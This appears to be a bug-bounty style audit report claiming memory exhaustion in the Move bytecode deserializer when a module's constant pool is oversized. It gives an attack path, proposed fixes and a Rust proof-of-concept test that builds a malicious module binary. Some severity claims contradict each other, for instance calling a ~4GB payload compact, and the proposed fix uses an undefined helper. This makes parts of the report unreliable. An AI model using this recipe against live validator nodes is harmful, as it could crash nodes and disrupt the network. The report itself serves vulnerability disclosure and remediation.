# Audit Report

## Title
Memory Exhaustion via Unbounded Constant Pool Size During Module Deserialization

## Summary
The Move bytecode deserializer does not validate the number of entries in a module's constant pool before deserializing them. An attacker can craft a malicious module binary with up to 4GB of constant pool data containing billions of minimal constant entries, causing memory exhaustion and node crashes during deserialization, before any verification logic executes.

## Finding Description

The vulnerability exists in the module deserialization pipeline. When a Move module is submitted for publishing, the deserialization process reads table metadata including the constant pool size, which is constrained only by `TABLE_SIZE_MAX` (4GB of byte data) but not by entry count. [1](#0-0) 

During deserialization, the `Table::load()` method iterates through the binary data, deserializing and pushing each `Constant` struct into a `Vec<Constant>` until all bytes are consumed: [2](#0-1) 

The constant pool is loaded via this mechanism: [3](#0-2) 

**Attack Path:**

1. Attacker crafts a malicious module binary with a CONSTANT_POOL table header declaring `count = 0xFFFF_FFFF` (4GB)
2. The table content is filled with minimal `Constant` entries (e.g., boolean constants requiring ~3 bytes each in serialized form: type tag + length + data)
3. With 4GB of data and 3-byte constants, this yields approximately **1.4 billion constant entries**
4. During `CompiledModule::deserialize()`, the `Table::load()` loop iterates ~1.4 billion times
5. Each iteration allocates and pushes a `Constant` struct to the Vec, causing repeated reallocations
6. Memory exhaustion occurs **before any verification logic executes**

The `Constant` struct definition: [4](#0-3) 

**Why Existing Protections Fail:**

The `BoundsChecker` only validates that indices referencing constants are within bounds of the already-deserialized pool, not the pool size itself: [5](#0-4) 

Similarly, `constants::verify_module_impl()` iterates over the already-loaded pool without validating its size beforehand: [6](#0-5) 

While `CONSTANT_INDEX_MAX` limits which constants bytecode can reference to 65,535 entries: [7](#0-6) 

This limit is **not enforced** during deserialization. The deserializer will attempt to load all constants from the binary regardless of whether they can be referenced by bytecode.

## Impact Explanation

**Severity: HIGH** (Validator node slowdowns/crashes)

This vulnerability enables resource exhaustion attacks against validator nodes:

- **Node Availability**: Validators attempting to deserialize the malicious module will experience severe memory pressure, leading to out-of-memory conditions, process termination, or system instability
- **Consensus Impact**: If this occurs during block execution (when a block containing the malicious module publish transaction is being processed), affected validators may crash or timeout, potentially impacting consensus liveness
- **Deterministic but Asymmetric**: All honest validators will attempt to deserialize the module, making the attack deterministic, but the attacker only needs to submit one transaction containing minimal data that expands to billions of in-memory objects

This aligns with Aptos Bug Bounty **High Severity** criteria: "Validator node slowdowns" and "API crashes."

## Likelihood Explanation

**Likelihood: HIGH**

- **Attack Complexity**: Low - attacker only needs to craft a malicious binary, which requires understanding the Move binary format but no privileged access
- **Attacker Requirements**: Any account with sufficient gas to submit a module publishing transaction
- **Detection Difficulty**: The attack payload is compact (~4GB binary) but expands to massive memory consumption, making it difficult to detect via simple size limits
- **Exploit Timing**: Occurs during transaction execution in the mempool or block processing phase, before any business logic validation

The attack is practical and requires no special privileges beyond normal transaction submission capabilities.

## Recommendation

Enforce that the number of entries in the constant pool cannot exceed `CONSTANT_INDEX_MAX` (65,535) during deserialization, before allocating memory for the entries. Add validation in the `Table::load()` method or immediately after table headers are read.

**Proposed Fix:**

Add a validation step in `build_common_tables()` after reading table metadata but before calling `table.load()`:

```rust
// In build_common_tables(), before loading CONSTANT_POOL:
TableType::CONSTANT_POOL => {
    // Validate pool size before deserialization
    if let Some(max_entries) = estimate_max_entries(table.count, MIN_CONSTANT_SIZE) {
        if max_entries > CONSTANT_INDEX_MAX as u32 {
            return Err(
                PartialVMError::new(StatusCode::MALFORMED)
                    .with_message(format!(
                        "Constant pool size exceeds maximum referenceable entries: {} bytes could contain {} entries but max is {}",
                        table.count, max_entries, CONSTANT_INDEX_MAX
                    ))
            );
        }
    }
    table.load(binary, common.get_constant_pool(), load_constant)?;
}
```

Alternatively, add a counter in `Table::load()` to track entries loaded and enforce the limit:

```rust
fn load<T>(
    &self,
    binary: &VersionedBinary,
    result: &mut Vec<T>,
    deserializer: impl Fn(&mut VersionedCursor) -> BinaryLoaderResult<T>,
) -> BinaryLoaderResult<()> {
    let start = self.offset as usize;
    let end = start + self.count as usize;
    let mut cursor = binary.new_cursor(start, end);
    let mut entry_count = 0u32;
    
    while cursor.position() < self.count as u64 {
        // Enforce maximum entries to prevent memory exhaustion
        if entry_count >= TABLE_INDEX_MAX as u32 {
            return Err(
                PartialVMError::new(StatusCode::MALFORMED)
                    .with_message("Table contains too many entries")
            );
        }
        result.push(deserializer(&mut cursor)?);
        entry_count += 1;
    }
    Ok(())
}
```

## Proof of Concept

```rust
// Proof of Concept - Rust test demonstrating the vulnerability
#[test]
fn test_constant_pool_memory_exhaustion() {
    use move_binary_format::file_format::*;
    use move_binary_format::file_format_common::*;
    
    // Create a malicious binary with oversized constant pool
    let mut binary = Vec::new();
    
    // Magic bytes
    binary.extend_from_slice(&BinaryConstants::MOVE_MAGIC);
    
    // Version (e.g., VERSION_6 = 6)
    binary.push(6);
    binary.extend_from_slice(&[0, 0, 0]); // version padding
    
    // Table count = 1 (only CONSTANT_POOL)
    binary.push(1);
    
    // Table header: CONSTANT_POOL (type=0x6)
    let table_offset = binary.len() as u32 + 1 + 4 + 4; // skip header
    binary.push(0x6); // TableType::CONSTANT_POOL
    binary.extend_from_slice(&table_offset.to_le_bytes());
    
    // Table size: set to maximum (4GB) or large value
    // For PoC, use a smaller but still problematic value like 100MB
    let table_size: u32 = 100_000_000; // 100MB
    binary.extend_from_slice(&table_size.to_le_bytes());
    
    // Generate minimal constants to fill the space
    // Each constant: type (1 byte Bool) + length (1 byte = 0) + data (1 byte)
    let constant_data = vec![
        0x01, // SignatureToken::Bool
        0x01, // data length = 1
        0x01, // data = true
    ];
    
    // Repeat to fill table_size bytes
    let num_constants = table_size as usize / constant_data.len();
    for _ in 0..num_constants {
        binary.extend_from_slice(&constant_data);
    }
    
    // Attempt deserialization - this will try to allocate millions of Constant structs
    let result = CompiledModule::deserialize(&binary);
    
    // In vulnerable code, this would cause OOM before returning error
    // After fix, should return error during deserialization
    match result {
        Ok(module) => {
            // This demonstrates the vulnerability - module loaded successfully
            // but with millions of constants
            println!("VULNERABLE: Module loaded with {} constants", 
                     module.constant_pool.len());
            assert!(module.constant_pool.len() > 1_000_000, 
                    "Should have loaded millions of constants");
        },
        Err(e) => {
            // After fix, should get MALFORMED error
            println!("FIXED: Deserialization rejected with error: {:?}", e);
        }
    }
}
```

**Note:** Running this PoC on vulnerable code may cause the test process to run out of memory. The fix should cause it to fail gracefully with a `MALFORMED` error during deserialization.

### Citations

**File:** third_party/move/move-binary-format/src/file_format_common.rs (L40-40)
```rust
pub const TABLE_SIZE_MAX: u64 = 0xFFFF_FFFF;
```

**File:** third_party/move/move-binary-format/src/file_format_common.rs (L57-57)
```rust
pub const CONSTANT_INDEX_MAX: u64 = TABLE_INDEX_MAX;
```

**File:** third_party/move/move-binary-format/src/deserializer.rs (L573-588)
```rust
impl Table {
    /// Generic function to deserialize a table into a vector of given type.
    fn load<T>(
        &self,
        binary: &VersionedBinary,
        result: &mut Vec<T>,
        deserializer: impl Fn(&mut VersionedCursor) -> BinaryLoaderResult<T>,
    ) -> BinaryLoaderResult<()> {
        let start = self.offset as usize;
        let end = start + self.count as usize;
        let mut cursor = binary.new_cursor(start, end);
        while cursor.position() < self.count as u64 {
            result.push(deserializer(&mut cursor)?)
        }
        Ok(())
    }
```

**File:** third_party/move/move-binary-format/src/deserializer.rs (L733-735)
```rust
            TableType::CONSTANT_POOL => {
                table.load(binary, common.get_constant_pool(), load_constant)?;
            },
```

**File:** third_party/move/move-binary-format/src/file_format.rs (L1324-1327)
```rust
pub struct Constant {
    pub type_: SignatureToken,
    pub data: Vec<u8>,
}
```

**File:** third_party/move/move-binary-format/src/check_bounds.rs (L139-144)
```rust
    fn check_constants(&self) -> PartialVMResult<()> {
        for constant in self.view.constant_pool() {
            self.check_constant(constant)?
        }
        Ok(())
    }
```

**File:** third_party/move/move-bytecode-verifier/src/constants.rs (L20-25)
```rust
fn verify_module_impl(module: &CompiledModule) -> PartialVMResult<()> {
    for (idx, constant) in module.constant_pool().iter().enumerate() {
        verify_constant(idx, constant)?
    }
    Ok(())
}
```
